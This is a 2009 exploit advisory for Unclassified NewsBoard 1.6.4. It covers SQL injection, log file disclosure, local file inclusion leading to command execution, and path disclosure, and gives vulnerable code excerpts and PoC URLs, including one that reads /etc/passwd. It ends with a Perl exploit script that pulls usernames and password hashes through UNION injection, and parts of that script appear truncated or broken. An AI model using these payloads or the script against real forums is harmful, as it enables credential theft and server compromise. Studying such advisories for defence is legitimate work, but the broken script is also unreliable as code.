Unclassified NewsBoard 1.6.4 Multiple Remote Vulnerabilities
============================================================


# Author_	girex
# Date_		31/05/2009

# CMS_		Unclassified NewsBoard 1.6.4 (and maybe lower)
# Dork_		"This board is powered by the Unclassified NewsBoard software, 1.6.4"

# Multiple remote vulnerabilities

# 1) Remote SQL Injection 				(php.ini regardless)
# 2) Logs File Disclosure 				(register_globals = On)
# 3) Local File Inclusion / Remote Command Execution	(register_globals = On / magic_quotes_gpc = Off)
# 4) Full Path Disclosure				

#################################################################################

# 1) Remote SQL Injection 
# Works regardless of php.ini settings

# File: /unb_lib/common.lib.php - Lines: 78-103

if (get_magic_quotes_gpc())
{
	#$mq_old = array(&#039;\\\&#039;&#039;, &#039;\\"&#039;, &#039;\\\\&#039;, &#039;\\0&#039;);
	#$mq_new = array(&#039;\&#039;&#039;,   &#039;"&#039;,   &#039;\\&#039;,   &#039;&#039;);
	foreach ($_GET as $key => $value)
	{
		if (is_string($_GET[$key])) $_GET[$key] = stripslashes($value);
	}
	foreach ($_POST as $key => $value)
	{
		#if (!is_array($_POST[$key])) $_POST[$key] = str_replace($mq_old, $mq_new, $value);
		if (is_string($_POST[$key])) $_POST[$key] = stripslashes($value);
	}
	foreach ($_REQUEST as $key => $value)
	{
		if (is_string($_REQUEST[$key])) $_REQUEST[$key] = stripslashes($value);
	}
	foreach ($_COOKIE as $key => $value)
	{
		if (is_string($_COOKIE[$key])) $_COOKIE[$key] = stripslashes($value);
	}
	foreach ($_FILES as $key => $value)
	{
		$_FILES[$key][&#039;name&#039;] = stripslashes($value[&#039;name&#039;]);
	}
}

# If magic_quotes_gpc are set to On it stripslash all input variables, so we don&#039;t need mq = off.
# Now the vars are sanizated for SQL queries with UnbDbEncode function in database.lib.php

# File: /unb_lib/database.lib.php - Lines: 805-825

function UnbDbEncode($str, $forLIKE = false)
{
	// Clean parameters
	$str = strval($str);

	$str = str_replace(&#039;\\&#039;, &#039;\\\\&#039;, $str);	   		<==  escape backslash
	$str = str_replace(&#039;\&#039;&#039;, &#039;\\\&#039;&#039;, $str);    		<==  escape quote
	#$str = str_replace(&#039;\&#039;&#039;, &#039;\&#039;\&#039;&#039;, $str);  
	$str = str_replace(&#039;"&#039;, &#039;\\"&#039;, $str);	   		
	$str = str_replace("\n", &#039;\\n&#039;, $str);
	$str = str_replace("\r", &#039;\\r&#039;, $str);
	$str = str_replace("\t", &#039;\\t&#039;, $str);

	if ($forLIKE)
	{
		$str = str_replace(&#039;\\&#039;, &#039;\\\\&#039;, $str);		<== this is wrong, delete the escaping of the quote for example
		$str = str_replace(&#039;%&#039;, &#039;\\%&#039;, $str);
		$str = str_replace(&#039;_&#039;, &#039;\\_&#039;, $str);
	}
	return $str;
}

# As you can see, if $forLIKE is set to true the effect of the escaping is vanificated
# &#039;  => \&#039; => (if $forLIKE == true) => \\&#039;

# File: /unb_lib/search.inc.php - lines: 

		if ($_REQUEST[&#039;InSubject&#039;] || $_REQUEST[&#039;InMessage&#039;])
		{
			$highlight = array();
			$words = explode_quoted(&#039; &#039;, $_REQUEST[&#039;Query&#039;]);      <== 
			...
			foreach ($words as $word)
			{
				if ($word != &#039;&#039;)
				{
					...
					// case-insensitive search
					$in_subject .= &#039;(p.Subject LIKE \&#039;%&#039; . UnbDbEncode($word, true) . &#039;%\&#039; OR &#039; . 		<==
						&#039;t.Desc LIKE \&#039;%&#039; . UnbDbEncode($word, true) . &#039;%\&#039; AND p.Date = t.Date)&#039;;
					...	
					$in_message .= &#039;(p.Msg LIKE \&#039;%&#039; . UnbDbEncode($word, true) . &#039;%\&#039;)&#039;;	<== vuln sanizating
					// this doesn&#039;t work:
					...
					$query .= &#039;(&#039;;
					if ($_REQUEST[&#039;InSubject&#039;]) $query .= $in_subject;
					if ($_REQUEST[&#039;InSubject&#039;] && $_REQUEST[&#039;InMessage&#039;]) $query .= ($not ? &#039; AND &#039; : &#039; OR &#039;);
					if ($_REQUEST[&#039;InMessage&#039;]) $query .= $in_message;
					$query .= &#039;)&#039;;

	......

	if (!$error)
	{
		$record = $UNB[&#039;Db&#039;]->FastQuery(			<== vuln query
			/*table*/ array(
				array(&#039;&#039;, &#039;Posts&#039;, &#039;p&#039;, &#039;&#039;),
				array(&#039;LEFT&#039;, &#039;Threads&#039;, &#039;t&#039;, &#039;p.Thread = t.ID&#039;)),
			/*fields*/ $_REQUEST[&#039;ResultView&#039;] == 1 ?
				&#039;t.ID, t.Forum&#039; :
				&#039;p.ID, t.ID, t.Forum&#039;,
			/*where*/ $query,
			/*order*/ &#039;&#039;,
			/*limit*/ &#039;&#039;,
			/*group*/ $_REQUEST[&#039;ResultView&#039;] == 1 ? &#039;t.ID&#039; : &#039;&#039;);


# $_REQUEST[&#039;Query&#039;] var is &#039;sanizated&#039; with the bugged function UnbDbDecode so we can manipulate the query.

# PoC: [host]/[path]/forum.php?req=search&Query=xxx&#039;))OR/**/1=1%23&ResultView=2&InMessage=1&Sort=2&Forum=0

#################################################################################

# 2) Logs file disclosure
# Need register_globals = On

# File: /unb_lib/common.lib.php  -  lines: 127-135

// unregister_globals :) for more security (except for install/import scripts)
if (ini_get(&#039;register_globals&#039;) && !$UNB[&#039;Installing&#039;])
{
	if (sizeof($_SESSION)) foreach (array_keys($_SESSION) as $key) unset($$key);
	if (sizeof($_GET)) foreach (array_keys($_GET) as $key) unset($$key);
	if (sizeof($_POST)) foreach (array_keys($_POST) as $key) unset($$key);
	if (sizeof($_COOKIE)) foreach (array_keys($_COOKIE) as $key) unset($$key);
	if (sizeof($_SERVER)) foreach (array_keys($_SERVER) as $key) unset($$key);
}

# This is simply bypassable using and defining global vars via GLOBALS array
# like forum.php?GLOBALS[var]=value

# Now let&#039;s see rss.inc.php
# File: /unb_lib/rss.inc.php  -  lines: 69-77

$type = $_REQUEST[&#039;type&#039;];
...
if ($type == 1)
	$filename = strtolower(str_replace(&#039;.&#039;, &#039;&#039;, $format)) . &#039;.&#039; . $forumid . &#039;.xml&#039;;
if ($type == 2)
	$filename = strtolower(str_replace(&#039;.&#039;, &#039;&#039;, $format)) . &#039;.allposts.xml&#039;;

$filename = dirname(__FILE__) . &#039;/rsscache/&#039; . $filename;

$rss = new UniversalFeedCreator();
if ($cache_time) $rss->useCached($format, $filename, $cache_time);   	<== vuln function

# If type is set for example to 3, we can define $filename

# File: /unb_lib/feedcreator.lib.php  

	function useCached($filename="", $timeout=3600) {
		$this->_timeout = $timeout;
		if ($filename=="") {
			$filename = $this->_generateFilename();
		}
		if (file_exists($filename) AND (time()-filemtime($filename) < $timeout)) {
			$this->_redirect($filename);			<== vuln function
		}
	}

# NOTE: the file as you can see must be edited in the last hour
	...

	function _redirect($filename) {

		Header("Content-Type: ".$this->contentType."; charset=".$this->encoding."; filename=".basename($filename));
		Header("Content-Disposition: inline; filename=".basename($filename));
		readfile($filename, "r");				<== here local file disclosure			
		die();
	}

# NOTE: the file as you can see must be edited in the last hour
# So it is only usefull to see log&#039;s files. (we can&#039;t access them directly couse use of .htaccess)

# PoC: [host]/[path]/forum.php?req=rss&type=3&forum=1&GLOBALS[filename]=../logs/board-yyyy-mm-dd.log
# Where yyyy-mm-gg are the current year month and day.

#################################################################################

# 3) Local file inclusion / Remote command execution
# Need register_globals = On and magic_quotes_gpc = Off

# File: /unb_lib/ute.runtime.lib.php - lines: 

function UteShowAll()
{
	global $UTE;

	if (!isset($UTE[&#039;__tplCollection&#039;]) || !is_array($UTE[&#039;__tplCollection&#039;])) return;
	
	foreach ($UTE[&#039;__tplCollection&#039;] as $tpl)
	{
	
		UteShow($tpl[&#039;file&#039;], $tpl[&#039;params&#039;]);
	}
	$UTE[&#039;__tplCollection&#039;] = null;
}

# UteShowAll is called to include local templates.. 
# But $UTE array is not properly inizialitizated..
# So $UTE[&#039;__tplCollection&#039;] array is writable via GLOBALS trick so let&#039;s see UteShow function...

function UteShow($file, &$params)
{
	global $UTE;

	$sourceFile = $UTE[&#039;__sourcePath&#039;] . &#039;/&#039; . $file;
	$cacheFile = $UTE[&#039;__cachePath&#039;] . &#039;/&#039; . $file . &#039;.php&#039;;	<== vulnerable variable

	...

	if ($UTE[&#039;__haltOnFileError&#039;] && !file_exists($cacheFile) && !is_readable($cacheFile))
		die(&#039;<b>UTE error:</b> cannot include template "&#039; . $file . &#039;", does not exist or is not readable<br />&#039;);

	$ret = include($cacheFile);		<== vulnerable inclusion
	if (!$ret)
		die(&#039;<b>UTE error:</b> error including template "&#039; . $file . &#039;"<br />&#039;);

	...
	return true;
}

# So there is a local file inclusion working with rg = on and mq = off couse use of nullbyte

# PoC: [host]/[path]/forum.php?GLOBALS[UTE][__tplCollection][a][file]=../../../../../../../../../../../../etc/passwd%00

# NOTE: you can obatin a Remote Command Execution:

  - injecting php code in log&#039;s file and including it.
  - uploading an attachment in your topic with malicious code.
  - uploading an avatar with malicios code in exif data.

#################################################################################

# 4) Full path disclosure

# Finally to get a simply full path disclosure make this request:
# /[host]/[path]/extra/import/import_wbb1.php


#################################################################################
########################## Remote SQL Injection Exploit #########################
#################################################################################

#!/usr/bin/perl
# Unclassified NewsBoard 1.6.4 Remote SQL Injection Exploit
# Coded by girex

use LWP::UserAgent;
use HTTP::Cookies;

if(not defined $ARGV[0])
{
	print "\nusage: perl $0 <host> <path>\n";
	print "example: perl $0 localhost /unb/\n\n";
	exit;
} 

my $lwp = new LWP::UserAgent;
my $cookie_jar =  new HTTP::Cookies;

$lwp->cookie_jar($cookie_jar);
$lwp->default_header(&#039;Accept-Language: en-us,en;q=0.5&#039;);
$lwp->agent(&#039;User-Agent: Mozilla/5.0 (X11; U; Linux; it; rv:1.9.0.10) Firefox/3.0.10&#039;);


my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  &#039;http://&#039; . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= &#039;/&#039; unless $target =~ /\/$/;

banner();
my $id = &#039;1&#039;;					# change if need
my $abs_path = get_abs_path();  		# using path disclosure bug

print "[+] Path disclosure: $abs_path\n" if defined $abs_path;

$injection = "-1) AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,table_name,".
	     "12,13,14,15,16,17,18,19 FROM information_schema.tables WHERE table_name LIKE &#039;%_GroupMembers&#039; LIMIT 0,1#";

$table_name = make_inj($injection); 

if(defined $table_name and $table_name =~ /(\w+)_GroupMembers/)
{ 
}
else
{
}	

# Change this query if need
$injection = "-1) AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,concat(Name,0x3a,Password),".

$login = make_inj($injection);

if(defined $login)
{
	($username, $hash) = split(&#039;:&#039;, $login,2);
	print "[+] Username: $username\n[+] Hash: $hash\n\n";

	if(length($hash) == 32)
	{
		print "[+] Password is hashed in md5 use this cookie to authenticate:\n";
		print "[+] Cookie: $cookie\n\n";
	}
	elsif(length($hash) == 34)
	{
		print "[-] Hash retrieved is NOT a md5, so can&#039;t retrieve cookie to authenticate.\n";
		print "[-] See the source to know how to bruteforce it\n\n";
	}
	else
	{
		$password = $1 if $hash =~ /\{(.+)\}/;
		print "[+] Password is in plain-text use $username and $password to login!\n\n";
	}
}
else
{
}

sub get_abs_path()
{
	my $res = $lwp->get($target.&#039;extra/import/import_wbb1.php&#039;);
	
	if($res->is_error)
	{
		return undef;
	}

	if($res->content =~ /in <b>(.*)extra\/import\/import_wbb1.php<\/b> on line/)
	{
		return $1;
	}

	return $undef;
}

{
	my $res = $lwp->get($target.&#039;forum.php&#039;);

	if($res->is_error)
	{
		print "[-] Unable to request ${target}forum.php\n";
		print "[-] ". $res->status_line."\n\n";
		exit;
	}
	
	if($res->as_string =~ /Set-Cookie: unb(\d+)sess=(\w{32})/)
	{
		$v = $1;
		$val = $2;
	}

	return "unb${v}";
}

sub make_inj()
{
	my $inj = hex_str(shift);
	my $final_inj = "1&#039;)AND(1=2))UNION/**/SELECT/**/$inj,-1111,-1111%23";

	my $res = $lwp->get($target."forum.php?req=search&Query=${final_inj}&ResultView=2&InMessage=1&Forum=0&set_lang=en");

	if($res->is_error)
	{
		print "[-] ". $res->status_line . "\n\n";
		exit;
	}

	if($res->content =~ /<small>Subject:<\/small> <b>(.+)<\/b>/)
	{
		return $1;
	}

	open(DEBUG, &#039;>&#039;, &#039;debug.htm&#039;);
	print DEBUG $res->content;
	close(DEBUG);

	return undef;
}

sub hex_str()
{
	return &#039;0x&#039;. unpack("H*", shift);
}

sub banner()
{
	print "\n[+] Unclassified NewsBoard 1.6.4 Remote SQL Injection Exploit\n";
	print "[+] Coded by girex\n\n";
}




